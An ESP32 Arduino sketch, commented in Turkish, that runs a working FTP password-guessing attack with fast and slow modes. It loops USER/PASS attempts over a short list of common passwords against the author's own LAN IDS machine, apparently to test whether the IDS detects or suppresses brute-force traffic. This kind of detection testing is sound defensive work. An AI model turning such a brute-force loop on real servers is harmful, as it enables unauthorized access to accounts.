// ============================================================================
//  esp32_ftp_patator.ino  --  CICIDS SINIFI: FTP-Patator (parola deneme)
// ============================================================================
//  YETKI: SADECE sana ait, ayni yerel LAN'daki Windows IDS makinesine karsi,
//  kontrollu/yetkilendirilmis dogrulama testi icindir. SADECE atilabilir/test
//  hesabi hedefle -- gercek/uretim hesabi DEGIL.
//
//  NEDEN FTP, SSH DEGIL (Pi'deki hydra ssh:// karsiligi):
//    SSH-Patator icin gercek bir SSH el-sikismasi (Diffie-Hellman + sifreleme)
//    gerekir; ESP32'de bunu yapan hafif bir istemci pratikte YOK/agir. Buna
//    karsilik FTP DUZ METIN bir protokoldur: banner oku, "USER x", "PASS y"
//    satirlarini duz soketle gonder -- ESP32 icin BASIT ve gerceklenebilir.
//    Ayrica FTP-Patator CICIDS-2017'de ZATEN ayri bir siniftir, yani SSH yerine
//    FTP kullanmak sinif haritasindan sapma DEGIL, tam ortada bir sinif.
//
//  HEDEF TARAFI GEREKSINIMI: Windows'ta 21 portunda bir FTP sunucusu calismali.
//    01_windows_setup.ps1 istege bagli olarak pyftpdlib ile atilabilir bir test
//    FTP sunucusu baslatir (bkz. o dosyadaki -EnableFtp anahtari). FTP sunucusu
//    yoksa bu sketch her denemede baglanamaz.
//
//  IKI MOD (denetim F2 -- hydra -t16 vs -t4 karsiligi):
//    MODE_FAST : denemeler arasi bekleme ~0 -> hizli ardisik baglanti; port 21'e
//                >=200 farkli baglanti/60sn -> is_conn_flood -> VOLUMETRIK dal,
//                NET alarm ("SYN/Baglanti Seli" olarak; etiket quirk, tespit dogru).
//    MODE_SLOW : denemeler ARASINDA ATTEMPT_DELAY_MS bekleme (F2 -- EN ONEMLI):
//                kisa FTP akislari conn_flood esiginin altinda kalir -> NON-
//                VOLUMETRIK / LSTM dali. immature-clamp + R26 konsey vetosu +
//                OOD kapisi GERCEK bir brute-force akisini yanlislikla bastirir
//                mi? Mongo'da suppressed_by + status'a bak (asil F2 testi).
//
//  ARDUINO IDE: Board = "ESP32 Dev Module". Ek kutuphane gerekmez. 115200.
// ============================================================================

#include <WiFi.h>
#include "secrets.h"   // local, not in git: copy secrets.example.h

// ----- DUZENLENEBILIR DEGISKENLER -------------------------------------------
const char* WIFI_SSID = SECRET_WIFI_SSID;   // set in secrets.h
const char* WIFI_PASS = SECRET_WIFI_PASS;   // set in secrets.h
IPAddress   TARGET_IP(SECRET_TARGET_IP);    // set in secrets.h (IDS machine LAN IP)
const uint16_t FTP_PORT = 2121;              // FTP kontrol portu

const char* USERNAME = "testuser";         // ATILABILIR test hesabi (gercek hesap DEGIL)

// Deneme parolalari (kucuk TEST listesi -- gercek sizinti listesi degil).
// NOT: dogru parola ("esp32test") KASITLI olarak listede DEGIL -- boylece
// hicbir deneme basarili olmaz, erken durma (found=true) tetiklenmez ve
// FAST modda tum 200+ baglanti gercekten kurulur (is_conn_flood testi icin).
const char* PASSWORDS[] = {
  "123456", "password", "admin", "root", "toor",
  "letmein", "qwerty", "test123", "P@ssw0rd", "changeme"
};
const int NUM_PASSWORDS = sizeof(PASSWORDS) / sizeof(PASSWORDS[0]);

// MOD SECIMI: hizli (volumetrik) icin true, yavas (F2 davranissal) icin false.
const bool MODE_FAST = true;               // <-- E-fast (volumetrik) testi icin true
const uint32_t ATTEMPT_DELAY_MS = 1500;    // MODE_SLOW'da denemeler arasi bekleme
const int  ROUNDS = 30;                    // parola listesini kac tur don (hacim icin)
// ----------------------------------------------------------------------------

void connectWiFi() {
  Serial.printf("[WiFi] '%s' agina baglaniliyor", WIFI_SSID);
  WiFi.mode(WIFI_STA);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  while (WiFi.status() != WL_CONNECTED) { delay(400); Serial.print("."); }
  Serial.printf("\n[WiFi] Baglandi. ESP32 IP = %s\n", WiFi.localIP().toString().c_str());
  Serial.println("[i] Bu IP'yi 04_mongo_analysis.py --attacker-ip degerine yaz.");
}

// Bir satir yanit oku (kisa zaman asimiyla); Serial'e yazdirmaz.
String readLine(WiFiClient& c, int timeoutMs) {
  String line = "";
  uint32_t t0 = millis();
  while (millis() - t0 < (uint32_t)timeoutMs) {
    while (c.available()) {
      char ch = c.read();
      if (ch == '\n') return line;
      if (ch != '\r') line += ch;
    }
    delay(5);
  }
  return line;  // zaman asiminda eldeki (bos olabilir)
}

// Tek bir USER/PASS denemesi: baglan, banner oku, USER gonder, PASS gonder, kapat.
bool tryLogin(const char* user, const char* pass) {
  WiFiClient client;
  if (!client.connect(TARGET_IP, FTP_PORT, 1500)) {
    Serial.println("  [!] FTP'ye baglanilamadi (sunucu 21 portunda calisiyor mu?).");
    return false;
  }
  readLine(client, 1500);                          // 220 banner
  client.printf("USER %s\r\n", user);
  readLine(client, 1500);                          // 331 sifre iste
  client.printf("PASS %s\r\n", pass);
  String resp = readLine(client, 1500);            // 230 basari / 530 red
  client.print("QUIT\r\n");
  client.stop();
  // 230 = giris basarili. Kisa/hatali yanitlar red sayilir.
  bool success = resp.startsWith("230");
  Serial.printf("  USER=%s PASS=%-10s -> %s\n", user, pass,
                success ? "230 BASARILI" : (resp.length() ? resp.c_str() : "(red/zaman asimi)"));
  return success;
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n============================================================");
  Serial.println(" ESP32 CANLI-ATES -- CICIDS FTP-Patator (parola deneme)");
  Serial.println("============================================================");
  Serial.printf(" HEDEF        : %s:%u   KULLANICI: %s (atilabilir test hesabi)\n",
                TARGET_IP.toString().c_str(), FTP_PORT, USERNAME);
  Serial.printf(" MOD          : %s\n", MODE_FAST ? "FAST (volumetrik dal beklenir)"
                                                  : "SLOW (F2 -- davranissal/LSTM dal)");
  Serial.printf(" PAROLA x TUR : %d x %d = %d deneme\n",
                NUM_PASSWORDS, ROUNDS, NUM_PASSWORDS * ROUNDS);
  Serial.println(" YETKI        : yalnizca sana ait hedef, yetkili lab testi.");
  Serial.println("------------------------------------------------------------");

  connectWiFi();
  Serial.println("\n[>>>] Parola denemeleri basliyor...\n");

  bool found = false;
  for (int r = 0; r < ROUNDS && !found; r++) {
    for (int i = 0; i < NUM_PASSWORDS; i++) {
      if (tryLogin(USERNAME, PASSWORDS[i])) { found = true; break; }
      if (!MODE_FAST) delay(ATTEMPT_DELAY_MS);   // SLOW: F2 davranissal profil
      else            delay(5);                  // FAST: sadece minik nefes (hiz yine bounded)
    }
    Serial.printf("  --- tur %d/%d bitti ---\n", r + 1, ROUNDS);
  }

  Serial.println("\n============================================================");
  Serial.println(found ? " Bir parola tuttu (test hesabi)." : " Hicbir parola tutmadi (beklenen).");
  if (MODE_FAST) {
    Serial.println(" Beklenti (Mongo): hizli -> is_conn_flood/is_flood, is_volumetric=True,");
    Serial.println("  status=ATTACK. Volumetrik dalda veto yok.");
  } else {
    Serial.println(" Beklenti (Mongo, F2): non-volumetrik akislar. suppressed_by ve status'a bak:");
    Serial.println("  {committee_dissent|ood|immature_flow} + status!=ATTACK = gercek brute-force");
    Serial.println("  yanlislikla bastirildi (testin asil aradigi F2 bulgusu).");
  }
  Serial.println("============================================================");
}

void loop() {
  delay(10000);  // tek seferlik; tekrar icin RESET.
}
